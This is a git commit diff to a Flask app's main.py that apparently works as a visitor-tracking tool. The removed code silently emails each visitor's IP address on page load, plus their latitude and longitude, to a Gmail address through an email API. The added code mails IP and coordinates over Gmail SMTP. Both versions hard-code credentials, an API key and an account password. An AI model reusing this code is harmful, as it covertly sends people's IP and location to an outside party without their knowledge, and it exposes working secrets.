6580ea1a7e5a7fede3bcc58d868c0ba9a1f2cc36
gowano2022 <59827733+gowano2022@users.noreply.github.com>
2023-06-25 00:34:43 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,79 +1,43 @@
 from flask import Flask, request
-import requests
+import smtplib
+import geocoder
 
 app = Flask(__name__)
- #app.config['DEBUG'] = True
 
 @app.route('/')
 def index():
-    # Send the IP address to Gmail
-    send_ip_to_gmail(request.remote_addr)
-
-    # Render the index.html page
     return app.send_static_file('index.html')
 
-@app.route('/location', methods=['POST'])
-def location():
-    # Parse the location data from the request body
-    lat = request.form['latitude']
-    lon = request.form['longitude']
+@app.route('/send_location', methods=['POST'])
+def send_location():
+    ip_address = request.form['ip_address']
+    latitude = request.form['latitude']
+    longitude = request.form['longitude']
 
-    # Send the IP and location data to Gmail
-    send_location_to_gmail(request.remote_addr, lat, lon)
+    if latitude and longitude:
+        location = (float(latitude), float(longitude))
+        send_email(ip_address, location)
+    else:
+        send_email(ip_address, None)
 
-    # Return a response to the client
-    return 'Location received successfully.'
+    return 'Result sent to Gmail!'
 
-def send_ip_to_gmail(ip):
-    # Set up the email parameters
-    BASE_URL = "https://nz3x68.api.infobip.com"
-    API_KEY = "App 1c324f190303bfaa25163865179285b6-cc9f31d7-4383-40f7-9b10-de318fb4c44d"
-    SENDER_EMAIL = "01028838444a@selfserviceib.com"
-    RECIPIENT_EMAIL = "01028838444a@gmail.com"
-    EMAIL_SUBJECT = "Client IP Address"
-    EMAIL_TEXT = "The client IP address is: " + ip
+def send_email(ip_address, location):
+    sender_email = 'titolion980@gmaoil.com'
+    receiver_email = '01028838444a@gmail.com'
+    password = 'Gomaa@123'
 
-    form_data = {
-        "from": SENDER_EMAIL,
-        "to": RECIPIENT_EMAIL,
-        "subject": EMAIL_SUBJECT,
-        "text": EMAIL_TEXT
-    }
+    subject = 'IP and Location Information'
+    message = f'IP Address: {ip_address}\n'
+    if location:
+        message += f'Latitude: {location[0]}, Longitude: {location[1]}'
 
-    all_headers = {
-        "Authorization": API_KEY
-    }
+    email_text = f'Subject: {subject}\n\n{message}'
 
-    response = requests.post(BASE_URL + "/email/3/send", data=form_data, headers=all_headers)
-
-
-    return response.json()
-
-def send_location_to_gmail(ip, lat, lon):
-    # Set up the email parameters
-    BASE_URL = "https://nz3x68.api.infobip.com"
-    API_KEY = "App 1c324f190303bfaa25163865179285b6-cc9f31d7-4383-40f7-9b10-de318fb4c44d"
-    SENDER_EMAIL = "01028838444a@selfserviceib.com"
-    RECIPIENT_EMAIL = "01028838444a@gmail.com"
-    EMAIL_SUBJECT = "Client Location"
-    EMAIL_TEXT = "The client IP address is: " + ip + "\n" + \
-                  "The client location is: " + str(lat) + ", " + str(lon)
-
-    form_data = {
-        "from": SENDER_EMAIL,
-        "to": RECIPIENT_EMAIL,
-        "subject": EMAIL_SUBJECT,
-        "text": EMAIL_TEXT
-    }
-
-    all_headers = {
-        "Authorization": API_KEY
-    }
-
-    response = requests.post(BASE_URL + "/email/3/send", data=form_data, headers=all_headers)
-
-
-    return response.json()
+    with smtplib.SMTP('smtp.gmail.com', 587) as server:
+        server.starttls()
+        server.login(sender_email, password)
+        server.sendmail(sender_email, receiver_email, email_text)
 
 if __name__ == '__main__':
     app.run()
